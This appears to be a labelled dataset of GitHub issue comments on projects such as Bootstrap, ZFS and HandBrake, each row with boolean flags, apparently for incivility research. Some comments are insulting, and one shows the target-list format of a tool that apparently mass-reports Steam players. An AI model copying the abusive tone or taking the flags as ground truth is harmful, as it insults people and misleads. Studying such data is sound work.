ionic-pwa-toolkit/ionic-team/22/297335582,ionic-pwa-toolkit/ionic-team/22,"Resources Before submitting an issue, please consult our docs. Stencil version (run  from a terminal/cmd prompt and paste output below) I'm submitting a ...  (check one with ""x"") [x] bug report [ ] feature request [ ] support request =&gt; Please do not submit support requests here, use one of these channels  or  behavior  Fetching the last master commits, something's broken out of the box Adding the removed bundle components in stencil.config.js, doesn't fix the thing. BTW, not sure that running  is the best way to keep up-to-date with the project, I've renamed this remote and I'm rebasing on my local directory. Unless there's a better way ? ",False,True
mojo/kraih/1236/404168986,mojo/kraih/1236,"I don't see this discussion end constructively, therefore i'm locking this issue. ",False,True
screensaver.asteroids/notspiff/9/303132347,screensaver.asteroids/notspiff/9,After the kodi request is approved becomes this cleaned up and changed in one commit. ,False,True
bootstrap/twbs/7482/16072191,bootstrap/twbs/7482,"back to the topic this is, once again, an issue with nebulous spec language (and the original desire to retrospectively bless clearly presentational old-school tags with some form of ""semantics"" instead of ripping them out). it comes down to divining ""what did the spec authors really mean by that"" and drawing your own conclusions from it to fit your view. i'd actually say that there are bigger issues to tackle, and that - whether or not it's a slight misuse or not of the particular element - at least it doesn't do any harm (or good either, as no screenreader, scraper, etc actually care about small or misuse of i etc). ",False,True
serverless-stack-com/AnomalyInnovations/63/371939619,serverless-stack-com/AnomalyInnovations/63,@friend Google does handle JS for SEO but a better pattern for this is to use a static page generator like Jekyll for your landing pages. And then use React for your actual app. This way you get to create content for SEO purposes while still having a single page app. For example this tutorial itself is in Jekyll (for SEO purposes) and the demo app is in React. ,False,True
bootstrap/twbs/3057/5141284,bootstrap/twbs/3057,"""Don't be a JavaScript hipster. Add semi-colons."" I love this one! Seriously, use the f@#king semicolons. ",False,True
code-d/Pure-D/29/433501044,code-d/Pure-D/29,make a new issue with error logs ,False,True
core/owncloud/8282/41244080,core/owncloud/8282,@friend  I just switch my server from Windows to Ubuntu. Chinese zip file just work fine except with file name screwed up. But you won't see anything unless you open the archive with 7-zip. You mean when you download something from browser it shows 0 byte? OS Ubuntu 14.04 Server Apache 2.4.7 Client Windows 8.1 pro browser  Mozilla firefox 29 ,False,True
lxqt/lxqt/1628/441442731,lxqt/lxqt/1628,"But you know that XDG say should - it is not written in stone. so you can stop complaining here. Please. In the gentoo case - gentoo set it ""right"". We respect the setting and don't override it - so if you like it that way, go the extra mile and just copy the damn configurations into the place you want to have them as distribution. That is what was announced. /etc/xdg is free for distributions to use with no patching. We can discuss this forever and don't reach consensus. The only thing is - we can override things like the preset path (with a configuration switch) or the installation path (also with a configurations switch) ",False,True
hoverfly/SpectoLabs/821/471915452,hoverfly/SpectoLabs/821,"Hi John, Please find below details of questions with highlighted answers  Is the real service a production service? à Real service is not a production service. How long is capturing going to continue if the real service is responding fine? à if real service is responding fine then on first time hoverfly should capture the response in simulation file and after that its gives real response till service is up. Should Hoverfly discard data after a certain period of time? à At the first successful response of the day, it should capture the response through hoverfly then Hoverfly should discard the previous recorded data. Hoverfly should wait for the real service in capture mode. How long should it wait? à Wait time should be configurable from our end as different services have different wait time. Does Hoverfly try again on the next request if there is no response if the last one timed out (note that in this circumstance Hoverfly will appear to be as slow as your timeout)? à if service is down then first hoverfly should declare that this service is down and goes into simulation mode Instead of that, does Hoverfly declare the real service down and respond immediately? àHoverfly should declare the service down and goes into simulation mode. How does Hoverfly know that the real service has come back? Is Hoverfly continually trying the real service perhaps? à Whenever we execute the test cases, if service is up, request should go to main application/service and hoverfly should also capture the response at that time, and if service is down then hoverfly should go into simulation mode.  Thanks &amp; Regards, Antika Chauhan On Mon, Mar 4, 2019, 457 PM John Davenport notifications@friend.com wrote ",False,True
rdpwrap/stascorp/613/447291787,rdpwrap/stascorp/613,I changed ini file in C\Program Files\RDP Wrapper to this  and then restart terminal services net stop termserv and then start it ,False,True
eXpand/eXpandFramework/176/425669443,eXpand/eXpandFramework/176,@friend suggested a failed mode which does not exist in main strategy ,False,True
coc.nvim/neoclide/305/450468273,coc.nvim/neoclide/305,"You have to increase your  to get all signatures, it's limitation of vim. The server can't know which one you're completing with just ",False,True
asmjit/asmjit/231/455809071,asmjit/asmjit/231,Read above. ,False,True
zfs/zfsonlinux/7401/379492263,zfs/zfsonlinux/7401,"Same machine, different dataset on the same pool. ",False,True
Titan/Marc3842h/145/459950548,Titan/Marc3842h/145,@friend what about the issue with victims.json not saving botted players in first place after reporting ? Did you fix that as well? ,False,True
screensaver.asteroids/notspiff/9/303344639,screensaver.asteroids/notspiff/9,"use of quote or angles is completely orthogonal as such. the only meaning is which is tested first (quotes mean check source directory, then include paths, angles the other way around). i'm just tired of the never-ending dance back and forth. i did like you did it, then it was changed to what is now with rebranding ease as the reason. ",False,True
puppeteer-sharp/kblok/736/437840435,puppeteer-sharp/kblok/736,"@friend we are getting a deadlock when we use the session for the very first time  thread is being stuck there, and it doesn't let puppeteer keep listening to the WebSocket to get the answer to that command. No joy yet. ",False,True
bootstrap/twbs/3057/5136922,bootstrap/twbs/3057,"coffeescript ftw? otherwise, if you're doing real javascript, do it right? p.s. (I'm not a coffeescripter yet, but it looks more and more like the right tool every day) ",False,True
flood/jfurrow/240/338082322,flood/jfurrow/240,"Might be easy to just pass plaintext credentials to the server behind the scenes if an option in the config (like mentioned above) is set, this removes any potential exploit that may arise from editing the security system to allow for sessions to be generated without proper authentication. ",False,True
dataverse/IQSS/1513/232957158,dataverse/IQSS/1513,"Related, possibly a duplicate #3105 ",False,True
zfs/zfsonlinux/7401/379495948,zfs/zfsonlinux/7401,"I can confirm this bug on a mirrored zpool. It is a production system so I didn't do much testing before downgrading to 0.7.6 pool ssdzfs-array state ONLINE status Some supported features are not enabled on the pool. The pool can     still be used, but some features are unavailable. [it is at the 0.6.5.11 features level] action Enable all features using 'zpool upgrade'. Once this is done,     the pool may no longer be accessible by software that does not support     the features. See zpool-features(5) for details.   scan scrub repaired 0B in 0h16m with 0 errors on Sun Apr  1 014659 2018 config NAME                                     STATE     READ WRITE CKSUM ssdzfs-array                             ONLINE       0     0     0   mirror-0                               ONLINE       0     0     0     ata-XXXX-enc  ONLINE       0     0     0     ata-YYYY-enc  ONLINE       0     0     0   mirror-1                               ONLINE       0     0     0     ata-ZZZZ-enc  ONLINE       0     0     0     ata-QQQQ-enc  ONLINE       0     0     0  errors No known data errors $zfs create ssdzfs-array/tmp $(run test as previously described; fails about 1/2 the time) $uname -a Linux MASKED 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 190337 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux I have attempted to reproduce the bug on 0.7.6 without success. Here is an except of one of the processor feature levels processor    3 vendor_id    GenuineIntel cpu family   6 model        26 model name   Intel(R) Core(TM) i7 CPU         920  @ 2.67GHz stepping     5 microcode    0x19 cpu MHz      1600.000 cache size   8192 KB physical id  0 siblings     4 core id      3 cpu cores    4 apicid       6 initial apicid   6 fpu      yes fpu_exception    yes cpuid level  11 wp       yes flags        fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc aperfmperf pni dtes64 monitor ds_cpl vmx est tm2 ssse3 cx16 xtpr pdcm sse4_1 sse4_2 popcnt lahf_lm tpr_shadow vnmi flexpriority ept vpid dtherm ida bogomips     5333.51 clflush size     64 cache_alignment  64 address sizes    36 bits physical, 48 bits virtual power management [    1.121288] microcode CPU3 sig=0x106a5, pf=0x2, revision=0x19 ",False,True
jekyll/jekyll/6948/386777055,jekyll/jekyll/6948,also background section could get some improvements - building website that will look good on regular displays and retina quiet challenging. creating multiple backgrounds for could be the solution to decrease loading time ,False,True
openvpn-client/dperson/165/445485794,openvpn-client/dperson/165,"You're looking at the container connected to the VPN container, your first message references . If you are following the directions from my container you're telling docker to not create a network for that container and to reuse the one from the VPN. So when you look at the network for  there is nothing there, because it didn't get it's own network stack. ",False,True
rails/rails/33677/414886139,rails/rails/33677,I'm gonna go ahead and get started on this... 😄 ,False,True
shlink/shlinkio/210/422337852,shlink/shlinkio/210,,False,True
vuejs.org/vuejs/974/369296402,vuejs.org/vuejs/974,"axe-core developer here. Custom attributes like the ones in Vue and Angular don't pose accessibility barriers, nor should they be called out as a failure of WCAG 4.1.1. This is an interpretation of the guideline, sure, but I'm going off of the feedback from the team of experts at Deque. They do not fail webpages for accessibility simply because they have custom attributes. If there is no barrier posed to users and the user agent can safely parse the page with the tags actually rendered, why would you call it a failure? axe-core does not call these out as violations because they aren't accessibility problems. NuValidator does, but most accessibility subject matter experts wouldn't. I don't think this is an issue at all. From my colleague John Foliot Secondly I would also dispute this. Accessibility is a continuum, not a checkmark. There are varying degrees of accessibility and marking up custom attributes as failures does a service to no one. We have a hard enough time getting adoption of accessibility as it is. I would recommend relaxing your definition of how to meet 4.1.1 and move on to problems with actual user impact. ",False,True
bootstrap/twbs/3057/5135317,bootstrap/twbs/3057,nope - that's a bug in jsmin. Probably should let @friend know about it though.  thanks! edit The code had already been changed to an  when i suggested the jsmin issue be filed as a bug. Bootstrap and jsmin play very well together. ,False,True
courseplay/Courseplay/3219/463040558,courseplay/Courseplay/3219,I guess that you didn't like that it was version 64 ,False,True
Panoptes-Front-End/zooniverse/11/60130571,Panoptes-Front-End/zooniverse/11,"Man, these ellipses are fun to draw. The only error I can produce is on the initial drag returning the cursor to the '0,0' point while the mouse is still being held down throws- ",False,True
eXpand/eXpandFramework/176/425668871,eXpand/eXpandFramework/176,wrong cause I already change my mind ) #175 is the first item of the new ,False,True
zfs/zfsonlinux/7401/379573786,zfs/zfsonlinux/7401,fwiw anything other than  is going to have problems with CPU overhead and I/O timeouts for lots of client accesses.. ZFS's insensitive/mixed lookup is really 'stupid'. ,False,True
zfs/zfsonlinux/7401/380144307,zfs/zfsonlinux/7401,"locked the conversation so this issue doesn't blow up too much due to media attention, the mailing list is always a viable location for discussion, this will be unlocked when the analysis is complete and we've released a FAQ of sorts. ",False,True
bootstrap/twbs/3057/5137126,bootstrap/twbs/3057,"Semicolons ARE the recommended practice... not just from Crockford, but also in Google's JS style guide ",False,True
expo/expo/3030/451477209,expo/expo/3030,"Just put in app.json     ""sdkVersion"" ""32.0.0"", and it should work again ) ",False,True
nokogiri/sparklemotion/1709/357411525,nokogiri/sparklemotion/1709,"Same here, and I really would like it if downgrading is not my only option ",False,True
homebrew-cask/Homebrew/52035/421866743,homebrew-cask/Homebrew/52035,"But you didn't even make a serious effort to (e.g. trying with brewdo), it would seem... Of course not; no one is claiming you do. As a maintainer though, I would expect more interest in getting the software to work for more people, however, rather than the clichéd ""doesn't work for me"" attitude. Anyway, this debate won't go anywhere I suspect. I'm glad you're open to accepting a PR. ",False,True
bootstrap/twbs/3057/5137335,bootstrap/twbs/3057,"Thanks to the stand-off on this issue, I have to maintain my own branch of Bootstrap with semicolons inserted so that it minifies gracefully. Keeping my repo in sync is not fun at all, so I'm deploying out-of-date versions with my apps. Given how much pain making production use of Bootstrap was, it felt like a version 0.2, not 2.0. ",False,True
github/atom/1815/443231655,github/atom/1815,"I also would prefer if I could just turn it off entirely -- the  one is very useful to me, but I have no desire to log into github and use it inside of atom, this ends up just being a permanent clutter to me. ",False,True
lxqt/lxqt/1628/441441848,lxqt/lxqt/1628,"Practically, even if that problem happens -- and even if it has a high probability -- nothing disastrous will happen. But it was a good point I hadn't thought about. ",False,True
courseplay/Courseplay/3219/463017291,courseplay/Courseplay/3219,cannot use the programme since updating it my player just freezes inside the cab and nothing works i have to exit the game............... ,False,True
pycodestyle/PyCQA/703/354802176,pycodestyle/PyCQA/703,"That's kind of a bad example though because you should be using  to clean up resources. It could lead to novices getting a ""wrong"" idea, I agree, but they're already doing it wrong in the first place. ",False,True
HandBrake/HandBrake/1584/423643309,HandBrake/HandBrake/1584,"We discussed it a long time ago  When the prototype UI looked very different When the proposed UI did not have the at-a-glance accordion source view Before testing with tens of thousands of users over years revealed that Batch processing does not create user problems Editing without a source loaded does not cause user confusion   When people thought I was just some crank out of left field with a bad idea who wouldn't stick around  I think a lot has changed and it's worth another look. Given all this, why are you so adamant that the current UI is the best and only way to do things? ",False,True
material-design-lite/google/4634/169503700,material-design-lite/google/4634,"Hello lovely humans, babel-core just published its new version 6.13.0. &lt;table&gt;   &lt;tr&gt;     &lt;th align=left&gt;       State     &lt;/th&gt;     &lt;td&gt;       Update rocket     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Dependency     &lt;/td&gt;     &lt;td&gt;       babel-core     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       New version     &lt;/td&gt;     &lt;td&gt;       6.13.0     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Type     &lt;/td&gt;     &lt;td&gt;       devDependency     &lt;/td&gt;   &lt;/tr&gt; &lt;/table&gt;This version is not covered by your current version range. Without accepting this pull request your project will work just like it did before. There might be a bunch of new features, fixes and perf improvements that the maintainers worked on for you though. I recommend you look into these changes and try to get onto the latest version of babel-core. Given that you have a decent test suite, a passing build is a strong indicator that you can take advantage of these changes by merging the proposed change into your project. Otherwise this branch is a great starting point for you to work on the update. Do you have any ideas how I could improve these pull requests? Did I report anything you think isn’t right? Are you unsure about how things are supposed to work? There is a collection of frequently asked questions and while I’m just a bot, there is a group of people who are happy to teach me new things. Let them know. Good luck with your project sparkles You rock! palm_tree  This pull request was created by greenkeeper.io. &lt;sub&gt;Tired of seeing this sponsor message? zap &lt;/sub&gt; ",False,True
code-d/Pure-D/29/183013277,code-d/Pure-D/29,this is the weirdest thing here... now after restarting the log again says nothing... like this morning. are u in the #d irc ? ,False,True
bootstrap/twbs/3057/5167375,bootstrap/twbs/3057,"Thanks, but I don't see it on GitHub nor in the E-mails that are pummeling us. ",False,True
openbmc/openbmc/1665/231079509,openbmc/openbmc/1665,Needs to be refactored to use new c++ / sdbusplus functions and move to new xyz.openbmc_project dbus base.  This appears to be an internally used only application which means phase 6. ,False,True
Elgg/Elgg/6779/41463476,Elgg/Elgg/6779,"@friend ""As examples, try to open/close widgets, try to open/close Admin options menu"" widgets only working for normal website.i thinks your mobilize not support for widgets. ",False,True
core/owncloud/26374/253998293,core/owncloud/26374,whatever... Maybe someone else will help and even if I wanted to do what you say I could not because each post is a different side of the issue and I don't understand all the interactions so all I would do is copy paste which would not change anything. ,False,True
nativefier/jiahaog/29/324127104,nativefier/jiahaog/29,"Hi, I tried Nativefier in Linux and would be great to use the search. Also installed the link above by @friend, and tried to compile the app again, but nothing changed. How to use this in practice? Wouldn't it make sense to have it compiled into Nativefier, without any external tools? (Simply put why is this issue closed?) ",False,True
eiffel-remrem-semantics/Ericsson/37/278012872,eiffel-remrem-semantics/Ericsson/37, Coverage decreased (-6.5%) to 35.177% when pulling 19d756f546c6cc08c93af8bc7ba7444d21df6e95 on xdurvakautomate into 92987daaee0e7458a87b3517a5f3e3cd1b872d1f on Ericssonmaster. ,False,True
find-and-replace/atom/322/71014939,find-and-replace/atom/322,"Indeed, it's a requested feature, why not let the user decide if enable it or not? ",False,True
openDCIM/samilliken/1114/450212046,openDCIM/samilliken/1114,"&lt;img width=""490"" alt=""screenshot 2018-12-27 13 05 07"" src="" this is the full extent of your user object the problem you are experiencing is that your user object isn't presenting the list of groups it is a member of and that is how the code is searching. &lt;img width=""512"" alt=""screenshot 2018-12-27 13 06 32"" src="" an actual understanding of the code I can again say that point where CN is listed is essentially useless and does next to nothing.  What you are suggesting whether you realize it or not is that we need to pull the list of users from each group and then check for membership on a per user basis or you're missing information from the ldap search. ",False,True
NanoCore/NanoAdblocker/87/356449799,NanoCore/NanoAdblocker/87,"Whitelist just completely disables filtering, that's different than disable one specific filter list for that domain. Currently, if I understood the code right, each filter list will be compiled separately and stored, all selected filters are merged together. The merging process need to be done every time a filter list is turned on or off. There are also snapshots of internal states for fast startup. I can't think of a single use case. Did you spelled ""harder"" wrong? ",False,True
npx/zkat/168/384346490,npx/zkat/168,"Same here. I don't see source for npx.cmd so I can fix it for them. Works fine on mac, linux, docker. Just Windows it does not work. ",False,True
bootstrap/twbs/3057/5206719,bootstrap/twbs/3057,@friend We need illustrators for that memorable story. ,False,True
PocketMine-MP/pmmp/2187/390037567,PocketMine-MP/pmmp/2187,Okay lol but you used the same template and everythings okay? How about you also do what you're telling me to do rather than just taking short cuts aswell. ,False,True
certbot/certbot/5433/358395842,certbot/certbot/5433,"@friend You have issues with your authoritative DNS servers. unboundtest confirms as much This isn't a problem the Certbot team can solve so I'm going to close this issue. I recommend you change DNS providers and see if the problem persists, or otherwise try to return to the community forum to solicit help debugging your authoritative DNS server's problems. ",False,True
find-and-replace/atom/322/374438661,find-and-replace/atom/322,"This left me bamboozled for a bit, but holding &lt;shift&gt; when clicking the find button is the solution to find previous. ",False,True
Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942/357430773,Google-Play-Music-Desktop-Player-UNOFFICIAL-/MarshallOfSound/2942,"It was constructive. by creating that option, when enabled, it displays two of essentially the same menus, which you haven't acknowledged.  That's not a good UI.  my original post provided constructive feedback to say when that option is enabled, hide the redundant menu to the right of it.  what value does that provide an end user.  please at least acknowledge that i didn't just complain and did provide a recommendation. ",False,True
eXpand/eXpandFramework/176/425668370,eXpand/eXpandFramework/176,i cannot follow ,False,True
image_inspector/TNRIS/80/402759567,image_inspector/TNRIS/80,Closing this in favor of #82 ,False,True
GoMint/GoMint/406/375145193,GoMint/GoMint/406,"Implement timings, add support for multithreading and how much count of thread to be used. For exemple how much thread to use chunks load and generation, to have another threads for ticking and entity movement, etc. Thank you. If you can* ",False,True
code-d/Pure-D/29/223745303,code-d/Pure-D/29,"&lt;img width=""1280"" alt=""screen shot 2016-06-04 at 11 03 22 am"" src=""",False,True
bootstrap/twbs/3057/5139452,bootstrap/twbs/3057,Reason to use semicolons - code will work properly and people will be able to get work done. Reason not to use semicolons - aesthetics and ego. Are you adults or children? ,False,True
angular.js/angular/1463/40701387,angular.js/angular/1463,"Whoever thought of this stripping logic should seriously rethink their career... Breaking people's stuff like this and wasting their time investigating this ridiculous problem makes me appreciate Linus Torvalds style of leadership even more... Fix your shit people, don't break something like passing MongoDB DBRefs with such hacks... Wish there was more professional mentality in web development circles, oh well. /rant ",False,True
vscode/Microsoft/14668/323556468,vscode/Microsoft/14668,Just got hit by this. I thought there was something wrong with my language server. O ,False,True
bootstrap/twbs/3057/13474066,bootstrap/twbs/3057,        You don't have to put periods at the end.                                 At the end of sentences.  But it can make them easier to read.   On the other hand      there's no real reason not to         just do whichever you want  ,False,True
react-helmet/nfl/373/403744893,react-helmet/nfl/373,Just ran into this issue as well. Only saw it happening for Safari and Chrome browsers. ,False,True
bootstrap/twbs/24475/472525573,bootstrap/twbs/24475,"I just merged the PR 🕺 I also made an issue about stuff that we need to look into, any help appreciated ) Huge thanks to @friend for adding functionality that helped us make this happen! ",False,True
Skript/SkriptLang/1568/425710224,Skript/SkriptLang/1568,"you can't really expect us to spend the time on fixing the support for an old, long unsupported version (by Spigot too), just because ""some things might break"" (meaning you didn't even try) and you can't find the time to test stuff yourself. ",False,True
Titan/Marc3842h/145/458249938,Titan/Marc3842h/145,"The victims.json format is ♠js {     ""victims"" [         {             ""steamid"" 76561198224231904, // Replace this with target steamid64             ""timestamp"" 1548700635 // Unix timestamp, feel free to keep at 0 if you don't know what it is         }     ] } ",False,True
taurus/taurus-org/137/260361015,taurus/taurus-org/137,Ticket moved from /p/sardana/tickets/319/ Can't be converted  _category taurus-qt  Original comment by tiagocoutinho (,False,True
find-and-replace/atom/322/66222380,find-and-replace/atom/322,"@friend are you basing that statement on some kind of statistics? If so, are those statistics public? ",False,True
expo/expo/3030/451468648,expo/expo/3030,"@friend Don't worry, thank you!  ) ",False,True
courseplay/Courseplay/3234/463921940,courseplay/Courseplay/3234,Please let's not turn this into FS-UK/OxygenDave scene. @friend You mistake a code repository issue tracker with a forum. Please clearly post an in-game mod issue following the guidelines here. @friend @friend let's close this and move on? ,False,True
coffeescript/jashkenas/4056/127719813,coffeescript/jashkenas/4056,"Hey,thank you for your prompt reply. According to your use case, I think I am missing something. How do I import the client side version of coffeescript from the Npm package? ",False,True
termux-packages/termux/2735/412966086,termux-packages/termux/2735,"@friend thank you for your time in this matter.  Your insight and instructions are appreciated.  There are no errors with bsdtar.  Just like there were none with Termux busybox tar until recently.  As I have mentioned before, your opinions of me are yours.  It would be great to hear a compliment rather than complaint from you btw. ",False,True
tickettest1/kbower/2770/268486809,tickettest1/kbower/2770,"kbower trac comment on Feb 4, 2016, 32448 AM [5421] ",False,True
sickrage-issues/SiCKRAGETV/205/52465321,sickrage-issues/SiCKRAGETV/205,is it possible to get the address used to access SB instead of IP - in the case of address(url) &lt;&gt; local IP ,False,True
cerberus/NEU-Libraries/692/83735376,cerberus/NEU-Libraries/692,I can't see a 500 error in the logs. We don't have a max upload size that I'm aware of. ,False,True
forum/standardnotes/39/427580484,forum/standardnotes/39,"Thanks @friend, noted! ",False,True
Polaris/PolarisSS13/4539/359081381,Polaris/PolarisSS13/4539,"How 'bout that tesla, @friend ",False,True
rippled/ripple/2241/337879491,rippled/ripple/2241,"Yes The smallest publicly available ledger is not 0 but 32570. That set aside, about 5 TB. You likely won't be able to use HDDs as a back end to rippled though, querying a historic ledger creates hundreds of thousands of random reads all over the database. SSDs typically can respond to a few thousand or tens of thousands of  these per second, HDDs are more in the tens to hundreds range. ",False,True
nokogiri/sparklemotion/1709/357677494,nokogiri/sparklemotion/1709,"The fix is already merged, although a new release is pending. See   then, it's better to stick with Ruby 2.4.2 on Windows. The Nokogiri team removed the GEMSPEC from sources, to disallow people building from master branch, since it is unstable and probably would contain bugs. You can read more about it here ",False,True
primitive/haskell/71/354133924,primitive/haskell/71,"I’ve locked the thread to prevent more drive by non constructive remarks. Positive reinforcement and collaboration are way more effective way to motivate folks, and honestly framing your heated remarks in terms of personal feelings or motivations would be more constructive than how some posters have approached it. Hypothetical positive remark “I would really like to test ghc 8.4 alpha with vanilla hackage and a release of primitive , because for structural reasons I can’t edit my cabal config in my homedir  to point to two package sources even though that’s supported. The reasons why I can’t include xyz. Additionally I want to make sure my software works on day zero of the final ghc 8.4 release and better sooner than later )“ I might be totally wrong on that last point but I do believe you can have your cabal config in your home dir point Either way, valid perspectives have been articulated, but drive by commenting isn’t actionable, and if not done in the right way can be demotivating. Vincent your comment did not add anything constructive or new. Shame on you.  You just did a more confrontational exaggerated version of what was already reasonably articulated by Neil and David. Happy New Years all, I’m off to visit my younger sister for a week of rest.  Use positivity and positive reinforcement to motivate folks. And in the future please  explain why tools like hackage head aren’t effective options for you to test libraries on an alpha quality compiler release please.  Explaining WHY in terms of actions or work flows or implicit needs we don’t know about is helpful. ",False,True
jekyll/jekyll/6948/389803714,jekyll/jekyll/6948,Plugins using the group  in a  are not visible in liquid as . Only plugins in the  are visible in . This is useful for conditional behaviour like ,False,True
bootstrap/twbs/7482/16101897,bootstrap/twbs/7482,In the Name of the Moon specs will punish you! ,False,True
bootstrap/twbs/3057/5142285,bootstrap/twbs/3057,"@friend There's a ""disable notifications for this issue"" link at the bottom. ",False,True
twitter-refresh/andrewjkerr/7/49814904,twitter-refresh/andrewjkerr/7,"Instead of having a pop-up, it might be worth looking into just greying out the icon when refreshing is disabled and lighting the icon back up when refreshing is enabled. ",False,True
bootstrap/twbs/3057/10674029,bootstrap/twbs/3057,"For the record, this was worth a talk ",False,True
termux-packages/termux/2735/412893686,termux-packages/termux/2735,@friend I just removed your 'spinner' from 'preproot' function and error disappeared. I'm currently doing a verification installation of TermuxArch - if error fixed i will post screenshots. ,False,True
code-d/Pure-D/29/238406860,code-d/Pure-D/29,"looks like this is fixed now, even though loading resolves takes ages sometimes ",False,True
opencv/opencv/12198/412564451,opencv/opencv/12198,"[edited] @friend, please, consult with your legal and stop using this conversation style ",False,True
rdpwrap/stascorp/601/448895969,rdpwrap/stascorp/601,"Hello, I followed the instructions from gitgotgone exactly but when I try to restart the service with  ""net start TermService"" I get A system error has occured System error 1067 has occured The process terminated unexpectedly I rebooted the computer and still same issue. Anyone have any thoughts? ",False,True
HandBrake/HandBrake/1517/347464573,HandBrake/HandBrake/1517,"Description of the problem Encode movie with apparent bad source disc.  Handbrake encodes less than 10%, shows a green SUCCESSFUL finish in queue as shown here (last on the list)  And the end of encode log as src/libbluray/bluray.c696 Skipping broken unit at 6708854784 [040357] reader done. 1 scr changes ♠` As a test, which has only upset me more, when I run this source media through multiple other encoder/video tools that even just copy the streams, literally every one but Handbrake quickly return errors like this (MakeMKV identified source as bad within 2 min into stream RIP and gave a very clear indication there was a problem with source)  With HB the result of this reported successful encode job is ultimately a truncated 21 minute BAD video file - accompanied with two thumbs up from Handbrake.  I do not nor ever have expected Handbrake to work any magic with a bad source, but any encoder should at least know when it has failed due to having a bad source, and in such until now I thought had been properly returning the job as failed on a bad source.  My HUGE concern now is as it stands that I have to go back and hand-parse EVERY encode log and watch every video to determine if the job was truly a success because, had this one instead been a 98% complete encode, seeing ""success"" in both the GUI and looking at the end of the the log for failure (which I would never usually even do unless the job showed as failed) I would have never caught the failure and simply moved it to my library and then wondered why parts either stuttered or did not play at all or in this case, the movie just stopped prematurely.  And given this example and depending on how long this bug has been in place, I'm sure it has already occurred for me and this is going to become VERY time-consuming to hand-parse logs or re-run my media through other tools to verify source media was readable or not. Parsing this known bad encode log for the word ""errors"" renders exactly twelve lines ending in ""errors""....and all twelve have ZERO before the word errors.  I can't stress enough how big of an issue this is. With all that said, if possible to nail it down, I would be interested in knowing how long this issue has existed so I can have an idea of just how long I have to back-trace my encodes and manually review all logs to ensure I don't have not yet watched bad encodes (that HB returned as good) now sitting in my media folders.  Also, is parsing for ""skipping broken unit"" in bad HB versions the best/only way to truly determine when an otherwise successful returned job was really a failure due to bad source media?  TIA! Steps to reproduce the problem Select source Add to queue Start encode queue Encode job shows erroneously shows success HandBrake version (e.g., 1.0.0) 20180729125104-ecf8523-master (2018073001) Operating system and version (e.g., Ubuntu 16.04 LTS, macOS 10.3 High Sierra, Windows 10 Creators Update) Win7x64 Error message text or screenshot Last job on the list is job in question showing as successful completion  HandBrake Activity Log required (see  Nightly 20180729125104-ecf8523-master (2018073001) OS Microsoft Windows NT 6.1.7601 Service Pack 1 Ram 16366 MB,  GPU Information   AMD Radeon HD 7470 - 8.922.0.0   AMD Radeon HD 7470 - 8.922.0.0 Screen 1920x1080 Temp Dir C\Temp\ Install Dir C\Program Files\HandBrake Nightly Data Dir C\Users\Encoder\AppData\Roaming\HandBrake\Nightly  -------------------------------------------   # Starting Encode ...  [025628] hb_init starting libhb thread [025628] 1 job(s) to process [025628] json job {   ""Audio"" {     ""AudioList"" [       {         ""DRC"" 0.0,         ""Encoder"" ""copy"",         ""Gain"" 0.0,         ""Mixdown"" -1,         ""NormalizeMixLevel"" false,         ""Samplerate"" 48000,         ""Track"" 0,         ""DitherMethod"" 0       },       {         ""DRC"" 0.0,         ""Encoder"" ""copy"",         ""Gain"" 0.0,         ""Mixdown"" -1,         ""NormalizeMixLevel"" false,         ""Samplerate"" 48000,         ""Track"" 1,         ""DitherMethod"" 0       },       {         ""DRC"" 0.0,         ""Encoder"" ""copy"",         ""Gain"" 0.0,         ""Mixdown"" -1,         ""NormalizeMixLevel"" false,         ""Samplerate"" 48000,         ""Track"" 4,         ""DitherMethod"" 0       }     ],     ""CopyMask"" [       ""copyac3"",       ""copydtshd"",       ""copydts"",       ""copytruehd""     ],     ""FallbackEncoder"" ""ac3""   },   ""Destination"" {     ""ChapterList"" [       {         ""Name"" ""Chapter 1""       },       {         ""Name"" ""Chapter 2""       },       {         ""Name"" ""Chapter 3""       },       {         ""Name"" ""Chapter 4""       },       {         ""Name"" ""Chapter 5""       },       {         ""Name"" ""Chapter 6""       },       {         ""Name"" ""Chapter 7""       },       {         ""Name"" ""Chapter 8""       },       {         ""Name"" ""Chapter 9""       },       {         ""Name"" ""Chapter 10""       },       {         ""Name"" ""Chapter 11""       },       {         ""Name"" ""Chapter 12""       },       {         ""Name"" ""Chapter 13""       },       {         ""Name"" ""Chapter 14""       },       {         ""Name"" ""Chapter 15""       },       {         ""Name"" ""Chapter 16""       }     ],     ""ChapterMarkers"" true,     ""AlignAVStart"" false,     ""File"" ""J\\RIP\\MKV\\Startrek 11.mkv"",     ""Mp4Options"" {       ""IpodAtom"" false,       ""Mp4Optimize"" false     },     ""Mux"" ""mkv""   },   ""Filters"" {     ""FilterList"" [       {         ""ID"" 2,         ""Settings"" {}       },       {         ""ID"" 4,         ""Settings"" {           ""mode"" ""7""         }       },       {         ""ID"" 11,         ""Settings"" {           ""crop-bottom"" ""140"",           ""crop-left"" ""0"",           ""crop-right"" ""0"",           ""crop-top"" ""140"",           ""height"" ""800"",           ""width"" ""1920""         }       },       {         ""ID"" 6,         ""Settings"" {           ""mode"" ""1""         }       }     ]   },   ""PAR"" {     ""Num"" 1,     ""Den"" 1   },   ""Metadata"" {},   ""SequenceID"" 0,   ""Source"" {     ""Angle"" 1,     ""Range"" {       ""Type"" ""chapter"",       ""Start"" 1,       ""End"" 16     },     ""Title"" 1,     ""Path"" ""U\\""   },   ""Subtitle"" {     ""Search"" {       ""Burn"" false,       ""Default"" true,       ""Enable"" true,       ""Forced"" true     },     ""SubtitleList"" [       {         ""Burn"" false,         ""Default"" false,         ""Forced"" false,         ""ID"" 1,         ""Offset"" 0,         ""Track"" 0       },       {         ""Burn"" false,         ""Default"" false,         ""Forced"" false,         ""ID"" 2,         ""Offset"" 0,         ""Track"" 1       }     ]   },   ""Video"" {     ""Encoder"" ""x264"",     ""Bitrate"" 10000,     ""TwoPass"" true,     ""Turbo"" 